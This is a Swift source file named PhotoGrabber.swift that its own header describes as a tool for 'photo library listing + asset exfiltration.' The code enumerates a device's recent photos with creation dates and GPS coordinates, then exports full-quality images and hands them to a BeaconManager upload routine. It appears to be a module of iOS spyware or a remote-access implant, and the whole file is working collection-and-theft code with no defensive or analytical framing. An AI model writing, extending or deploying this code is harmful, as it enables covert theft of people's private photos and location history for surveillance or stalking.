//
//  PhotoGrabber.swift
//  Photo library listing + asset exfiltration.
//

import Photos
import Foundation

final class PhotoGrabber {

    static let shared = PhotoGrabber()

    func requestPermission() {
        PHPhotoLibrary.requestAuthorization { _ in }
    }

    func listRecent(count: Int, completion: @escaping (String) -> Void) {
        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
        guard status == .authorized || status == .limited else {
            completion("photos not authorized")
            return
        }
        let opts = PHFetchOptions()
        opts.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
        opts.fetchLimit = count
        let assets = PHAsset.fetchAssets(with: opts)
        var results: [[String: Any]] = []
        assets.enumerateObjects { asset, _, _ in
            results.append([
                "id": asset.localIdentifier,
                "name": "\(asset.creationDate?.timeIntervalSince1970 ?? 0).jpg",
                "type": asset.mediaType == .video ? "video" : "image",
                "size": asset.pixelWidth * asset.pixelHeight,
                "date": Int(asset.creationDate?.timeIntervalSince1970 ?? 0),
                "location": asset.location.map { "\($0.coordinate.latitude),\($0.coordinate.longitude)" } ?? ""
            ])
        }
        let data = (try? JSONSerialization.data(withJSONObject: results)) ?? Data()
        completion(String(data: data, encoding: .utf8) ?? "[]")
    }

    /// Export the asset to a temp file and upload it.
    func uploadAsset(localId: String, completion: @escaping (Bool) -> Void) {
        let assets = PHAsset.fetchAssets(withLocalIdentifiers: [localId], options: nil)
        guard let asset = assets.firstObject else {
            completion(false)
            return
        }
        let opts = PHImageRequestOptions()
        opts.isSynchronous = true
        opts.isNetworkAccessAllowed = true
        opts.deliveryMode = .highQualityFormat
        PHImageManager.default().requestImageDataAndOrientation(for: asset, options: opts) { data, _, _, _ in
            guard let data = data else {
                completion(false)
                return
            }
            let url = FileManager.default.temporaryDirectory
                .appendingPathComponent("p\(Int(Date().timeIntervalSince1970)).jpg")
            do {
                try data.write(to: url)
                BeaconManager.shared.uploadFile(url: url, name: url.lastPathComponent, completion: completion)
            } catch {
                completion(false)
            }
        }
    }
}
